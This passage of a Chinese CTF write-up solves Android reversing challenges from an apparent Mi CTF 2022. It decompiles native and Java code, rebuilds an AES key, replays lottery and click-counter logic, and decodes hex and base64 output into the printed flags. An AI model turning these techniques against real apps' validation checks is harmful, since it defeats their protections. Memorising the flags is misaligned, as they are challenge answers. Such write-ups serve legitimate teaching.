+<p class="my-4 leading-7">so文件反编译，扔到IDA pro里，F5转换成伪代码</p>
+<p class="my-4 leading-7"><img alt="IDA pro YYDS" src="/static/image/android-2-1.c1e2cfbf.png"/></p>
+<p class="my-4 leading-7">大概意思是，将key和seed运算生成一个数组，作为密钥。用输入的字符串和密钥进行AES/128/ECB/noPadding进行加密，加密生成的字符串与maskData比较，判断输入字符串是否正确。</p>
+<p class="my-4 leading-7">maskData的值</p>
+<p class="my-4 leading-7"><img alt="maskData" src="/static/image/android-2-2.fb776133.png"/></p>
+<p class="my-4 leading-7">写个程序反向解密</p>
+<div class="language-python"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-python" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>from Crypto.Cipher import AES
+</span></span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">seed = 0x6b
+</span><span style="display:block;padding:0 1.25rem">maskData = [0x75, 0x5d, 0xf2, 0x5c, 0xd2, 0x38, 0x29, 0x89, 0x81,
+</span><span style="display:block;padding:0 1.25rem">            0x6f, 0xa7, 0x4d, 0xca, 0x51, 0x86, 0x70, 0x33, 0x97,
+</span><span style="display:block;padding:0 1.25rem">            0xa0, 0x4f, 0xff, 0xba, 0xce, 0x8f, 0x4d, 0x6f, 0xc4,
+</span><span style="display:block;padding:0 1.25rem">            0x34, 0xb0, 0x12, 0xdf, 0xe1]
+</span><span style="display:block;padding:0 1.25rem">key = [ord(e) for e in &quot;JustThisKeyHere!&quot;]
+</span><span style="display:block;padding:0 1.25rem">data = [ord(e) for e in &quot;1111111111111111&quot;]
+</span><span style="display:block;padding:0 1.25rem">data[0] = seed ^ key[0]
+</span><span style="display:block;padding:0 1.25rem">data[1] = seed ^ key[0] ^ key[1]
+</span><span style="display:block;padding:0 1.25rem">data[2] = data[1] ^ key[2]
+</span><span style="display:block;padding:0 1.25rem">data[3] = data[1] ^ key[2] ^ key[3]
+</span><span style="display:block;padding:0 1.25rem">data[4] = data[3] ^ key[4]
+</span><span style="display:block;padding:0 1.25rem">data[5] = data[3] ^ key[4] ^ key[5]
+</span><span style="display:block;padding:0 1.25rem">data[6] = data[5] ^ key[6]
+</span><span style="display:block;padding:0 1.25rem">data[7] = data[5] ^ key[6] ^ key[7]
+</span><span style="display:block;padding:0 1.25rem">data[8] = data[7] ^ key[8]
+</span><span style="display:block;padding:0 1.25rem">data[9] = data[7] ^ key[8] ^ key[9]
+</span><span style="display:block;padding:0 1.25rem">data[10] = data[9] ^ key[10]
+</span><span style="display:block;padding:0 1.25rem">data[11] = data[9] ^ key[10] ^ key[11]
+</span><span style="display:block;padding:0 1.25rem">data[12] = data[11] ^ key[12]
+</span><span style="display:block;padding:0 1.25rem">data[13] = data[11] ^ key[12] ^ key[13]
+</span><span style="display:block;padding:0 1.25rem">data[14] = data[13] ^ key[14]
+</span><span style="display:block;padding:0 1.25rem">data[15] = data[13] ^ key[14] ^ key[15]
+</span><span style="display:block;padding:0 1.25rem">print(data)
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">cryptor = AES.new(b&#x27;&#x27;.join(map(lambda x: int.to_bytes(x, 1, &#x27;little&#x27;), data)), AES.MODE_ECB)
+</span><span style="display:block;padding:0 1.25rem">origin_data = cryptor.decrypt(b&#x27;&#x27;.join(map(lambda x: int.to_bytes(x, 1, &#x27;big&#x27;), maskData)))
+</span><span style="display:block;padding:0 1.25rem">print(origin_data)</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">最后解密出来的值和flag{}拼接生成最后的flag（不像flag的flag）</p>
+<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>flag{S-NGN*9}}:3cy%%&gt;X,ELRlG1w*Zx[?-+}</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<h2 id="android-3-来抽奖吧" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#android-3-来抽奖吧">#</a>android-3 来抽奖吧</h2>
+<p class="my-4 leading-7">反编译后核心逻辑在于号码的计算成兑奖凭证的一段。将核心逻辑提取出来，计算一下。</p>
+<p class="my-4 leading-7">DataHolder.java</p>
+<div class="language-java"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-java" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>package com.sumygg.mictf2022.android_3;
+</span></span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">public class DataHolder {
+</span><span style="display:block;padding:0 1.25rem">    public static long[] a = new long[5];
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    public static long[] b = new long[5];
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    public static boolean[] c = new boolean[5];
+</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">b.java</p>
+<div class="language-java"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-java" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>package com.sumygg.mictf2022.android_3;
+</span></span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">public class b implements Runnable {
+</span><span style="display:block;padding:0 1.25rem">    public Thread a;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    public String b;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    public int c = 0;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    public int d = 1000;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    public long e = 0L;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    public long f = 0L;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    public b(int paramInt, long paramLong1, long paramLong2) {
+</span><span style="display:block;padding:0 1.25rem">        this.b = Integer.toString(paramInt);
+</span><span style="display:block;padding:0 1.25rem">        this.c = paramInt;
+</span><span style="display:block;padding:0 1.25rem">        DataHolder.a[paramInt] = 0L;
+</span><span style="display:block;padding:0 1.25rem">        DataHolder.b[paramInt] = 0L;
+</span><span style="display:block;padding:0 1.25rem">        DataHolder.c[paramInt] = false;
+</span><span style="display:block;padding:0 1.25rem">        this.e = paramLong1;
+</span><span style="display:block;padding:0 1.25rem">        this.f = paramLong2;
+</span><span style="display:block;padding:0 1.25rem">    }
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    public void a() {
+</span><span style="display:block;padding:0 1.25rem">        if (this.a == null) {
+</span><span style="display:block;padding:0 1.25rem">            Thread thread = new Thread(this, this.b);
+</span><span style="display:block;padding:0 1.25rem">            this.a = thread;
+</span><span style="display:block;padding:0 1.25rem">            thread.start();
+</span><span style="display:block;padding:0 1.25rem">        }
+</span><span style="display:block;padding:0 1.25rem">    }
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    public void run() {
+</span><span style="display:block;padding:0 1.25rem">        try {
+</span><span style="display:block;padding:0 1.25rem">            while (true) {
+</span><span style="display:block;padding:0 1.25rem">                int i = this.d;
+</span><span style="display:block;padding:0 1.25rem">                if (i != 0) {
+</span><span style="display:block;padding:0 1.25rem">                    long l = (1103515245L * this.f + 12345L) % 2147483648L;
+</span><span style="display:block;padding:0 1.25rem">                    this.f = l;
+</span><span style="display:block;padding:0 1.25rem">                    l %= 10L;
+</span><span style="display:block;padding:0 1.25rem">                    if (l == this.e)
+</span><span style="display:block;padding:0 1.25rem">                        this.d = i - 1;
+</span><span style="display:block;padding:0 1.25rem">                    long[] arrayOfLong = DataHolder.b;
+</span><span style="display:block;padding:0 1.25rem">                    i = this.c;
+</span><span style="display:block;padding:0 1.25rem">                    arrayOfLong[i] = l;
+</span><span style="display:block;padding:0 1.25rem">                    arrayOfLong = DataHolder.a;
+</span><span style="display:block;padding:0 1.25rem">                    arrayOfLong[i] = arrayOfLong[i] + 1L;
+</span><span style="display:block;padding:0 1.25rem">                    Thread.sleep(0L);
+</span><span style="display:block;padding:0 1.25rem">                    continue;
+</span><span style="display:block;padding:0 1.25rem">                }
+</span><span style="display:block;padding:0 1.25rem">                DataHolder.c[this.c] = true;
+</span><span style="display:block;padding:0 1.25rem">                return;
+</span><span style="display:block;padding:0 1.25rem">            }
+</span><span style="display:block;padding:0 1.25rem">        } catch (InterruptedException interruptedException) {
+</span><span style="display:block;padding:0 1.25rem">        }
+</span><span style="display:block;padding:0 1.25rem">    }
+</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">Awards.java</p>
+<div class="language-java"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-java" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>package com.sumygg.mictf2022.android_3;
+</span></span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">import java.util.Arrays;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">public class Awards {
+</span><span style="display:block;padding:0 1.25rem">    public static void main(String[] args) throws InterruptedException {
+</span><span style="display:block;padding:0 1.25rem">//        int[] award = new int[]{2, 3, 4, 5, 6};
+</span><span style="display:block;padding:0 1.25rem">        int[] award = new int[]{4, 1, 7, 6, 9};
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">        b b5 = new b(0, award[0], 123456L);
+</span><span style="display:block;padding:0 1.25rem">        b b3 = new b(1, award[1], 562L);
+</span><span style="display:block;padding:0 1.25rem">        b b1 = new b(2, award[2], 88962L);
+</span><span style="display:block;padding:0 1.25rem">        b b6 = new b(3, award[3], 98745123L);
+</span><span style="display:block;padding:0 1.25rem">        b b4 = new b(4, award[4], 2551024833L);
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">        b5.a();
+</span><span style="display:block;padding:0 1.25rem">        b3.a();
+</span><span style="display:block;padding:0 1.25rem">        b1.a();
+</span><span style="display:block;padding:0 1.25rem">        b6.a();
+</span><span style="display:block;padding:0 1.25rem">        b4.a();
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">        b1.a.join();
+</span><span style="display:block;padding:0 1.25rem">        b3.a.join();
+</span><span style="display:block;padding:0 1.25rem">        b4.a.join();
+</span><span style="display:block;padding:0 1.25rem">        b5.a.join();
+</span><span style="display:block;padding:0 1.25rem">        b6.a.join();
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">        System.out.println(Arrays.toString(DataHolder.a));
+</span><span style="display:block;padding:0 1.25rem">        System.out.println(Arrays.toString(DataHolder.b));
+</span><span style="display:block;padding:0 1.25rem">    }
+</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<h2 id="android-4-click_the_button" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#android-4-click_the_button">#</a>android-4 click_the_button</h2>
+<p class="my-4 leading-7">反编译，发现这个题要点10000次按钮才会有结果，将核心逻辑提取出来，重复10000次，获取的字符串。</p>
+<div class="language-java"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-java" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>package com.sumygg.mictf2022.android_5;
+</span></span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">public class ClickTheButton {
+</span><span style="display:block;padding:0 1.25rem">    public static int n = 0;
+</span><span style="display:block;padding:0 1.25rem">    public static int[] o = new int[]{0, 0, 0, 0, 0, 0, 0, 0};
+</span><span style="display:block;padding:0 1.25rem">    public static int[] p = new int[]{-1697858774, 1295603483, -1212291049, 1669685709, 1997247066, -1187674524, -1142408073, 1618842764};
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    private static String concat(String a, String b) {
+</span><span style="display:block;padding:0 1.25rem">        return a + b;
+</span><span style="display:block;padding:0 1.25rem">    }
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    public static void onClick() {
+</span><span style="display:block;padding:0 1.25rem">        String str;
+</span><span style="display:block;padding:0 1.25rem">        int k = n;
+</span><span style="display:block;padding:0 1.25rem">        if (k &gt; 10000)
+</span><span style="display:block;padding:0 1.25rem">            return;
+</span><span style="display:block;padding:0 1.25rem">        int i = 0;
+</span><span style="display:block;padding:0 1.25rem">        int j = 0;
+</span><span style="display:block;padding:0 1.25rem">        if (k == 10000) {
+</span><span style="display:block;padding:0 1.25rem">            for (i = 0; i &lt; 8; i++) {
+</span><span style="display:block;padding:0 1.25rem">                int[] arrayOfInt1 = o;
+</span><span style="display:block;padding:0 1.25rem">                k = arrayOfInt1[i];
+</span><span style="display:block;padding:0 1.25rem">                arrayOfInt1[i] = p[i] ^ k;
+</span><span style="display:block;padding:0 1.25rem">            }
+</span><span style="display:block;padding:0 1.25rem">            int[] arrayOfInt = o;
+</span><span style="display:block;padding:0 1.25rem">            StringBuilder stringBuilder = new StringBuilder();
+</span><span style="display:block;padding:0 1.25rem">            k = arrayOfInt.length;
+</span><span style="display:block;padding:0 1.25rem">            for (i = j; i &lt; k; i++) {
+</span><span style="display:block;padding:0 1.25rem">                String str2 = Integer.toHexString(arrayOfInt[i]);
+</span><span style="display:block;padding:0 1.25rem">                String str1 = str2;
+</span><span style="display:block;padding:0 1.25rem">                if (str2.length() == 1)
+</span><span style="display:block;padding:0 1.25rem">                    str1 = concat(&quot;0&quot;, str2);
+</span><span style="display:block;padding:0 1.25rem">                stringBuilder.append(str1);
+</span><span style="display:block;padding:0 1.25rem">            }
+</span><span style="display:block;padding:0 1.25rem">            str = stringBuilder.toString();
+</span><span style="display:block;padding:0 1.25rem">            System.out.println(str);
+</span><span style="display:block;padding:0 1.25rem">        } else {
+</span><span style="display:block;padding:0 1.25rem">            int m = k % 8;
+</span><span style="display:block;padding:0 1.25rem">            int[] arrayOfInt = o;
+</span><span style="display:block;padding:0 1.25rem">            j = arrayOfInt[m];
+</span><span style="display:block;padding:0 1.25rem">            byte[] arrayOfByte = new byte[4];
+</span><span style="display:block;padding:0 1.25rem">            arrayOfByte[0] = (byte) (j &gt;&gt; 24 &amp; 0xFF);
+</span><span style="display:block;padding:0 1.25rem">            arrayOfByte[1] = (byte) (j &gt;&gt; 16 &amp; 0xFF);
+</span><span style="display:block;padding:0 1.25rem">            arrayOfByte[2] = (byte) (j &gt;&gt; 8 &amp; 0xFF);
+</span><span style="display:block;padding:0 1.25rem">            arrayOfByte[3] = (byte) (j &amp; 0xFF);
+</span><span style="display:block;padding:0 1.25rem">            j = k;
+</span><span style="display:block;padding:0 1.25rem">            while (i &lt; 4) {
+</span><span style="display:block;padding:0 1.25rem">                k = (arrayOfByte[i] &amp; 0xFF | (arrayOfByte[i + 1] &amp; 0xFF) &lt;&lt; 8 | (arrayOfByte[i + 2] &amp; 0xFF) &lt;&lt; 16 | arrayOfByte[i + 3] &lt;&lt; 24) * -862048943;
+</span><span style="display:block;padding:0 1.25rem">                j ^= (k &lt;&lt; 15 | k &gt;&gt;&gt; 17) * 461845907;
+</span><span style="display:block;padding:0 1.25rem">                j = (j &gt;&gt;&gt; 19 | j &lt;&lt; 13) * 5 - 430675100;
+</span><span style="display:block;padding:0 1.25rem">                i += 4;
+</span><span style="display:block;padding:0 1.25rem">            }
+</span><span style="display:block;padding:0 1.25rem">            i = j ^ 0x4;
+</span><span style="display:block;padding:0 1.25rem">            i = (i ^ i &gt;&gt;&gt; 16) * -2048144789;
+</span><span style="display:block;padding:0 1.25rem">            i = (i ^ i &gt;&gt;&gt; 13) * -1028477387;
+</span><span style="display:block;padding:0 1.25rem">            arrayOfInt[m] = i ^ i &gt;&gt;&gt; 16;
+</span><span style="display:block;padding:0 1.25rem">        }
+</span><span style="display:block;padding:0 1.25rem">        n++;
+</span><span style="display:block;padding:0 1.25rem">    }
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    public static void main(String[] args) {
+</span><span style="display:block;padding:0 1.25rem">        for (int i = 0; i &lt;= 10000; i++) {
+</span><span style="display:block;padding:0 1.25rem">            onClick();
+</span><span style="display:block;padding:0 1.25rem">        }
+</span><span style="display:block;padding:0 1.25rem">    }
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">但得到的不是最终的flag，而是一串字符串。</p>
+<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>54576b365a6d78685a3374456231394f62315266596d566652585a7054434639</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">先用十六进制解码，又得到一个字符串，还不是flag。</p>
+<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>TWk6ZmxhZ3tEb19Ob1RfYmVfRXZpTCF9</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">使用网站， <a target="_blank" rel="noopener noreferrer" href="https://www.dcode.fr/cipher-identifier" class="link-_707cf  link_3b154 inline-link_3b154">https://www.dcode.fr/cipher-identifier</a> ，猜测一下是哪种加密方式，挨个尝试。最终发现是base64编码</p>
+<p class="my-4 leading-7"><a target="_blank" rel="noopener noreferrer" href="https://www.dcode.fr/base-64-encoding" class="link-_707cf  link_3b154 inline-link_3b154">https://www.dcode.fr/base-64-encoding</a></p>
+<p class="my-4 leading-7">解码获得flag。</p><!--/$--></div><div class="rspress-doc-footer"><div class="postFooter_2e2af flex flex-col"><div class="flex flex-col sm:flex-row sm:justify-around gap-4 pt-6"><div class="prev_edac1 flex flex-col"><a class="link_03735 pagerLink_edac1 cursor-pointer" target="" href="/2022/02/20/startup-with-observable-programming/index.html"><span class="desc_edac1">上一篇</span><span class="title_edac1">响应式编程初探</span></a></div><div class="next_edac1 flex flex-col"><a class="link_03735 pagerLink_edac1 next_edac1 cursor-pointer" target="" href="/2022/08/05/xiaomi-tv-6095-port-http-api/index.html"><span class="desc_edac1">下一篇</span><span class="title_edac1">小米电视 6095 端口 HTTP API 整理</span></a></div></div></div><footer class="mt-8"><div class="xs:flex pb-5 px-2 justify-end items-center"><div class="flex text-sm text-text-2 leading-6 sm:leading-8 font-medium"><p>最后编辑时间<!-- -->: <span>2024/2/12 18:55:54</span></p></div></div><div class="flex flex-col"><a href="https://github.com/sumy7/SumyBlog-rspress/blob/main/source/../source/_posts/2022-06-24-mi-ctf-writeup/2022-06-24-mi-ctf-writeup.md" target="_blank" class="editLink_2a169">📝 在 GitHub 上编辑此页</a></div><div class="flex flex-col sm:flex-row sm:justify-around gap-4 pt-6"><div class="prev_e7091 flex flex-col"></div><div class="next_e7091 flex flex-col"></div></div></footer></div></div></div><div class="aside-container_edeb4"><div><div></div><div class="flex flex-col"><div class="&lt;lg:hidden"><div id="aside-container" class="relative text-sm font-medium"><div class="leading-7 block text-sm font-semibold pl-3">目录</div><nav class="mt-1"><ul class="relative"><li><a href="#re-1-maze" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:0;font-weight:semibold"><span class="aside-link-text block">re-1 maze</span></a></li><li><a href="#web-1-签到题" 